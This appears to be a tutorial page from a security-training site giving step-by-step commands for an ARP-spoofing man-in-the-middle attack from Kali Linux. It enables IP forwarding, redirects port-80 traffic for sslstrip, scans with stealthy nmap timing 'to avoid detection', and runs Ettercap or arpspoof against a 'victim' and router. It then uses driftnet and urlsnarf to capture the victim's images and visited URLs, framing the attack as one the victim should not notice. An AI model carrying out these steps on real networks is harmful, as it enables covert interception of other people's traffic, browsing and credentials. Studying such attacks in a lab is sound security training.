Performing the spoof attack
===========================

Note: Change any names of interfaces (e.g. eth0) to whatever interface you're actually on in Kali, which will be different if you're using a native OS and not a VM. Also obviously change IP adresses to match your configs.

Setup and components
--------------------
You need the following things:
* Kali VM or physical machine ***on same network as router*** (see below)
* Some other VM or physical machine ***on same network***

To put VMs on the same network as your router (i.e. so they have internet access) you have to use Bridged Adapters in VirtualBox. See our page on :doc:`vbox`.

.. warning::
   Windows 8-10 users:

   *If you have no options under “bridged adapter”, similar to what is shown below, you have to follow instructions from the site below to disable Driver Signature Enforcement then reinstall VirtualBox. You can always re-enable it afterwards.*

.. figure::  images/bridged.png
   :align:   center

`Driver Signature Enforcement <http://www.drivethelife.com/windows-drivers/how-to-disable-driver-signature-enforcement-on-windows-10-8-7-xp-vista.html>`_

Tools used
++++++++++

* Ettercap (could also use arpspoof, a command line tool)
* driftnet (for entertainment... shows the images the person is using)
* urlsnarf (get a list of URLs they visit)
* sslstrip (doesn't always work because of HSTS headers but we can try)

Notes and Preparation
+++++++++++++++++++++

As always, it is best to actually understand what you're doing, so if you don't know the difference between an IP address and a MAC/hardware address and what protocols are associated with each. Good references: 

* http://www.webopedia.com/quick_ref/OSI_Layers.asp
* https://www.tummy.com/articles/networking-basics-how-arp-works/
* http://www.tldp.org/LDP/nag/node78.html

Enable forwarding and redirection
+++++++++++++++++++++++++++++++++
If you don't want your victim knowing he's getting attacked or shutting his computer off because "the internet broke" you need to forward his traffic both ways. To do this, you have to enable forwarding like so:

.. code-block:: console

   # echo 1 > /proc/sys/net/ipv4/ip_forward

You'll also want to strip ssl certs from traffic by redirecting encrypted traffic to a different port, which sslstrip will use, using iptables:

.. code-block:: console

   # iptables -t nat -A PREROUTING -i %iface -p tcp --dport 80 -j REDIRECT --to-port 8080

Start Ettercap (OR wait if using arpspoof)
------------------------------------------
Skip to "Scan the network" if using the CLI arpspoof tool instead.

Start Ettercap using the following command:

.. code-block:: console

   # ettercap -G

Scan the network and choose hosts
---------------------------------
In order to determine who your victim is, you'll need to scan your network. There are two ways to do this. The first is using nmap, which is the most popular scanning tool out there. It is extremely versatile and has several customization options. The second is using Ettercap itself. 

Using Ettercap
++++++++++++++
Begin Unified Sniffing and scan for hosts. 

.. figure::  images/e1.PNG
   :align:   center

.. figure::  images/e2.PNG
   :align:   center

Using Nmap
++++++++++
If you want to use nmap, you can do a basic scan of your network without any options. However, it's probably best to also take some steps to avoid detection. You can use the -sn option to ONLY scan for hosts without scanning for open ports, which will generate less traffic (and make for a faster scan). You can also use the -T paranoid|sneaky option to wait between scans to avoid detection See the `Timing and Performance <https://nmap.org/book/man-performance.html>`_ section of nmap's man page as well as the `Host Discovery <https://nmap.org/book/man-host-discovery.html>`_ section (and any others that interst you :))

.. code-block:: console

   # nmap -sS -sn -T sneaky 192.168.1.0/24

Adding hosts 
++++++++++++
If using Ettercap and you used Ettercap's built in scan tool, go to the Hosts List and add the router and your victim to Target 1 and Target 2.

.. figure::  images/e3.PNG
   :align:   center

If you used Nmap, you'll have to manually enter them in the Targets section of Ettercap, or use arpspoof below.

Arpspoof
--------
Start arpspoof 

.. code-block:: console

   # arpspoof -i eth0 -t [ip_victim] [ip_router] 
   # arpspoof -i eth0 -t [ip_router] [ip_victim] 

Start sslstrip
--------------
You'll want to use sslstrip to strip what traffic you can. Since we redirected traffic to 8080 earlier, tell it to listen to 8080 using this command:

.. code-block:: console

   # sslstrip -l 8080 -w /root/Desktop/sslstriplog

Viewing user activity: other commands (optional)
------------------------------------------------
If you want to use driftnet and urlsnarf to look at their pictures and stuff, open up 2 new tabs with Ctrl+Shift+T and have these commands ready:

.. code-block:: console

   # driftnet -i eth0
   # urlsnarf -i eth0 > /root/Desktop/urllog

.. figure::  images/e4.PNG
   :align:   center

.. figure::  images/e_urllog.PNG
   :align:   center

Make sure to stop the attack properly using Ettercap! It will "unspoof" things for you

.. figure::  images/estop.PNG
   :align:   center